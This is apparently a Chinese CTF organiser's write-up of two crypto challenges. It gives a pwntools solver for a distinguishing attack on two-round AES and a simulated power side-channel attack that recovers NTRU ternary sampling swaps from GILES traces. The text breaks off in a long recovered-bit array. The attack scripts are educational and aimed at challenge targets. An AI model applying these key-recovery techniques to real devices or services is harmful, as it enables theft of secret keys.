<p>因为这个题目比较简单，所以最开始出题在最头部加入了一轮轮密钥加，并设计了相关的算法来恢复，但因为麻烦，而且打通率低于预期（其实后来找到了原因，但题目已经提交上去了，只能下次再说），所以最后题目降低难度，恢复原状，将首部的轮密钥加去掉，即只是将遍历下降到4次机会，这就导致了从a11到t11的过程是敌手可控的，那么如果我能控制t，就会发现当t只有最后一个字节变化时，只会在最后一次列混合造成扩散，前面的12字节都是相同的，那么这也是个可行的区分特征，但泛化性不如原思路，在头部加入轮密钥的时候就会失效。</p>
<p>此外还有师傅在上面的思路之外利用差分将第二轮的密钥影响消除掉，这个也是常见的trick，可以把上面的2^16的表进一步下降到2^8的水平。但这位师傅是在区分攻击之外更进一步，做起了密钥恢复，这二者虽然密不可分，但对于区分攻击而言增加了工作量。</p>
<p>我的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line">addRoundKey=<span class="keyword">lambda</span> inp,key: xor(inp.rjust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>),long_to_bytes(key).rjust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>))</span><br><span class="line">subBytes=<span class="keyword">lambda</span> x,S:<span class="built_in">bytes</span>([S[i] <span class="keyword">for</span> i <span class="keyword">in</span> x])</span><br><span class="line">shiftRow=<span class="keyword">lambda</span> S:[\</span><br><span class="line">        S[<span class="number">0</span>],S[<span class="number">4</span>],S[<span class="number">8</span>],S[<span class="number">12</span>],\</span><br><span class="line">        S[<span class="number">5</span>],S[<span class="number">9</span>],S[<span class="number">13</span>],S[<span class="number">1</span>],\</span><br><span class="line">        S[<span class="number">10</span>],S[<span class="number">14</span>],S[<span class="number">2</span>],S[<span class="number">6</span>],\</span><br><span class="line">        S[<span class="number">15</span>],S[<span class="number">3</span>],S[<span class="number">7</span>],S[<span class="number">11</span>]\</span><br><span class="line">        ]</span><br><span class="line">mul2=<span class="keyword">lambda</span> x:(x&lt;&lt;<span class="number">1</span>)^<span class="number">0b100011011</span> <span class="keyword">if</span> x&amp;<span class="number">0x80</span> <span class="keyword">else</span> x&lt;&lt;<span class="number">1</span></span><br><span class="line">mul3=<span class="keyword">lambda</span> x:x^mul2(x)</span><br><span class="line"></span><br><span class="line">mixColomn=<span class="keyword">lambda</span> S:<span class="built_in">bytes</span>(<span class="built_in">sum</span>([[</span><br><span class="line">                       mul2(S[i])^mul3(S[i+<span class="number">1</span>])^S[i+<span class="number">2</span>]^S[i+<span class="number">3</span>],</span><br><span class="line">                       S[i]^mul2(S[i+<span class="number">1</span>])^mul3(S[i+<span class="number">2</span>])^S[i+<span class="number">3</span>],</span><br><span class="line">                       S[i]^S[i+<span class="number">1</span>]^mul2(S[i+<span class="number">2</span>])^mul3(S[i+<span class="number">3</span>]),</span><br><span class="line">                       mul3(S[i])^S[i+<span class="number">1</span>]^S[i+<span class="number">2</span>]^mul2(S[i+<span class="number">3</span>])</span><br><span class="line">                       ] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>)],[]))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_2r</span>(<span class="params">inp,key,S</span>):</span><br><span class="line">        <span class="comment">#c=addRoundKey(inp,key[0])</span></span><br><span class="line">        c=subBytes(inp,S)</span><br><span class="line">        c=shiftRow(c)</span><br><span class="line">        c=mixColomn(c)</span><br><span class="line">        c=addRoundKey(c,key[<span class="number">0</span>])</span><br><span class="line">        c=subBytes(c,S)</span><br><span class="line">        c=shiftRow(c)</span><br><span class="line">        c=mixColomn(c)</span><br><span class="line">        c=addRoundKey(c,key[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">S_BOX = [</span><br><span class="line">             <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">             <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">             <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">             <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">             <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">             <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">             <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">             <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">             <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">             <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">             <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">             <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">             <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">             <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">             <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    dic[i]=[mul2(S_BOX[mul2(S_BOX[<span class="number">0</span>])^i])]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        dic[i].append(mul2(S_BOX[mul2(S_BOX[c])^i])^dic[i][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    c=<span class="built_in">bytes</span>([randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    t=(((<span class="built_in">bytes</span>([<span class="number">0</span>])+c[<span class="number">1</span>:<span class="number">16</span>]).ljust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>))[:<span class="number">16</span>])</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(t)</span><br><span class="line">    a=<span class="built_in">int</span>(p.recvline()[<span class="number">6</span>:],<span class="number">16</span>)</span><br><span class="line">    ans=[a&gt;&gt;<span class="number">120</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        t=<span class="built_in">hex</span>(((<span class="built_in">bytes</span>([j])+c[<span class="number">1</span>:<span class="number">16</span>]).ljust(<span class="number">16</span>,<span class="string">b&quot;\00&quot;</span>))[:<span class="number">16</span>])[<span class="number">2</span>:]</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.sendline(t)</span><br><span class="line">        a=<span class="built_in">int</span>(p.recvline()[<span class="number">6</span>:],<span class="number">16</span>)</span><br><span class="line">        ans.append((a&gt;&gt;<span class="number">120</span>)^ans[<span class="number">0</span>])</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> ans[<span class="number">1</span>:<span class="number">4</span>]==dic[k][<span class="number">1</span>:<span class="number">4</span>]:</span><br><span class="line">            p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">    p.recvline()    </span><br><span class="line">    <span class="built_in">print</span>(i)    </span><br><span class="line">p.interactive()    </span><br></pre></td></tr></table></figure>

<p>因为出题的时候就评估到了，本题所提供的信息量就那些，收上来的wp这几种做法虽然有变换字节的位置和变换字节的环节不同，甚至最后确定的特征有区别，但都是下放到了合适的数据复杂度，所以只要是构造到具体字节从而降低复杂度进行攻击的方案都是预期的。如果是复现，还请各位师傅大胆尝试不同的位置，希望能帮到各位在传统对称密码算法分析的情景下找到新的兴趣点。</p>
<h3 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h3><p>论文是今年的<a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/document/9702284" title="Single-Trace Side-Channel Attacks on ω-Small Polynomial Sampling: With Applications to NTRU, NTRU Prime, and CRYSTALS-DILITHIUM">Single-Trace Side-Channel Attacks on ω-Small Polynomial Sampling: With Applications to NTRU, NTRU Prime, and CRYSTALS-DILITHIUM</a>，主要是分析在算法高斯采样预处理的过程中对三元多项式的直接攻击，除此之外在2018年的另一篇论文中也探讨了在揭秘环节直接攻击三元多项式的一些方案，但因为时间较为久远，对应的代码仓库没有了，猜测是那种实现最终被NTRU官方ban了，所以最后改换了这篇。</p>
<p>使用的仿真工具是<a target="_blank" rel="noopener" href="https://github.com/sca-research/GILES" title="GitHub - sca-research/GILES">GitHub - sca-research&#x2F;GILES</a>，相比于ELMO似乎更好上手些（他本身原来就叫ELMO2），但是没有合适的出题样例了，所以借这次写个完整的工具使用文档。</p>
<p>GILES处理的是可以直接移植到arm cortex M0机器上的指令，但同时因为他有仿真所用的部分函数，也不能直接交叉编译，所以我们还需要一个<a target="_blank" rel="noopener" href="https://github.com/sca-research/thumb-sim" title="GitHub - sca-research/thumb-sim: Thumb Timing Simulator">GitHub - sca-research&#x2F;thumb-sim: Thumb Timing Simulator</a>来生成编译文件。仿真器的函数头使用的是<a target="_blank" rel="noopener" href="https://github.com/sca-research/GILES/releases/download/1.1.0/elmo-funcs.h" title="elmo-funcs.h download">elmo-funcs.h download</a>，主要包括触发器相关的功能和读写字节相关的功能，需要注意的是字节读写似乎需要对齐到某个值，不然无法读取。</p>
<p>在利用GILES生成数据的时候，有电源模式和汉明重两种预设模式，但实际体验下来电源模式的数据生成感觉比较草率，不如ELMO的数据看起来真实，所以我出题一般是使用hw模式。btw他也提供模式的自定义，想着如果有机会能不能搜罗一下其他的模式像是汉明距啥的，然后做下开源开发者这样。</p>
<p>产生的数据是trs格式，用python的trsfile库可以读取，主要包括数据的采集轨迹和对应的注释数据，整体结构还很清晰。</p>
<p>NTRU实现有很多种版本，各有细微差异还都是官方的。第三轮提交文档中主要是分为steam Prime还是LPRrime，但是官方的代码又分hps和hrss两套算法实现版本，对应的参数不太一致；除此之外之前的NTRU open project实现还有具体差异，但代码删档了，无从考证。这次出题涉及到sample主要是在hps中，hrss系列使用的采样不完全一致，先找了相对好实现的。</p>
<p>NTRU三元多项式采样的整体思想是，先采样大量的随机数，然后在随机数后附加2bit的三元信息（0，1，2，其中2代表-1），然后对数组执行一遍类似快排的算法（但也不全是，感觉有点小差异）。为保证交换不会产生明显的timing问题，并更加贴合硬件执行，交换的算法比较有意思：用了一个比较复杂的比较系统，然后利用异或的逻辑，如果不需要交换那么掩码为0，整体都异或0，于是不交换；而如果需要交换，则将掩码设为全1，这样就可以留下a^b的结果，每个值都异或他，自然就得到了交换的结果。这个写法规避了分支判断会带来的时序差异，但是由于这个掩码全0还是全1有明显的汉明重差异，所以可以猜测会有明显的实际电源信号差异，原作者的实验结果也如是。那么我们的目的就是发现并还原这一组交换信号，自然就知道排序后的私钥表达式如何了。</p>
<p>但实际遇到一些难采样的问题是，由于标准实现中这个置换是通过宏定义实现的，而这段代码又是一个纯数据流代码，没什么控制性的代码，所以其分界线很模糊，时间片也不稳定（因为程序调用中间时间差很多，最短最长能差出两倍）或许通过电源模型好找相关性，但是在汉明重模型下太容易出错了，而这个顺序序列对误报又很严苛，所以这么出题也太折磨选手了，所以最后将宏定义写成函数，利用函数调用是压栈跳转的控制流来做分界，方便些。</p>
<p>理清这个思路，并熟悉trsfile和plt之后，其实实际做题就很容易了：先扒参数（使用的是比较小的原始参数N&#x3D;251,q&#x3D;256,p&#x3D;3,d&#x3D;72），然后通过官方源码计算敏感交换部分执行了多少次，然后在trs中大胆猜测（指已知敏感信息是32和0，那么在示例中可以看看有什么情况，甚至说根据题目trs直接猜间隔，毕竟总有能肉眼分布的连续32的数据，来判断最小轮间隔）小心求证（既然知道这个间隔是函数调用控制流引起的，那么其他地方的函数调用会不会导致误报，是不是还有可以再区分的特征？），然后扒出来序列，塞进源码中魔改一下就直接正向还原了，也没有多少逆向要读懂的部分。</p>
<p>题目将上架攻防世界，不再赘述，可见附件。</p>
<p>wp代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np                                                        </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt                                           </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> trsfile</span><br><span class="line">task=trsfile.<span class="built_in">open</span>(<span class="string">&#x27;/home/zuni-w/Desktop/catctf/sample_wp/task.trs&#x27;</span>  ,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">t=[i  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="built_in">len</span>(task[<span class="number">0</span>])-<span class="number">2</span>) <span class="keyword">if</span> task[<span class="number">0</span>][i-<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> task[<span class="number">0</span>][i] <span class="keyword">in</span> &#123;<span class="number">19</span>,<span class="number">20</span>,<span class="number">22</span>&#125; <span class="keyword">and</span> task[<span class="number">0</span>][i+<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> task[<span class="number">0</span>][i+<span class="number">2</span>]==<span class="number">0</span> ]</span><br><span class="line">n=[-<span class="number">1</span> <span class="keyword">if</span> <span class="number">32</span> <span class="keyword">in</span> task[<span class="number">0</span>][x:y] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(t,t[<span class="number">1</span>:]+[-<span class="number">1</span>])]</span><br><span class="line"><span class="built_in">print</span>(n)</span><br></pre></td></tr></table></figure>

<p>C 源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define int32 int32_t</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define int32_MINMAX(a,b) \</span></span><br><span class="line">do &#123; \</span><br><span class="line">  int32_t ab = (b) ^ (a); \</span><br><span class="line">  int32_t c = ((b) - (a)); \</span><br><span class="line">  c ^= ab &amp; (c ^ (b)); \</span><br><span class="line">  c &gt;&gt;= <span class="number">31</span>; \</span><br><span class="line">  printf(<span class="string">&quot;%d,&quot;</span>,c);\</span><br><span class="line">  c = ab; \</span><br><span class="line">  (a) ^= c; \</span><br><span class="line">  (b) ^= c; \</span><br><span class="line">  count++;  \  </span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">int</span> n[<span class="number">3773</span>]=</span><br><span class="line">&#123;</span><br><span class="line">-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span 